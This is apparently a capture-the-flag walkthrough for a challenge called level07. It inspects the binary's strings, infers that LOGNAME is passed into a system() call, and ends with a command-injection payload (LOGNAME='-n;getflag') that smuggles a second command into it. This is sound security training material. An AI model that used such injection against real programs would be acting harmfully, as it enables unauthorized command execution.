1. `./level07`
   ```bash
   level07
   ```

2. `xdd ./level07 | less`
   ```
   asprintf.getenv
   [...]
   LOGNAME./bin/echo %s
   ```

3. `LOGNAME=hello && ./level07`
   ```bash
   hello

   # GUESS
   # char *cmd = NULL;
   # 
   # asprintf(&cmd, "/bin/echo %s", getenv("LOGNAME"))
   # system(cmd);
   ```

4. `LOGNAME='-n;getflag' && ./level07`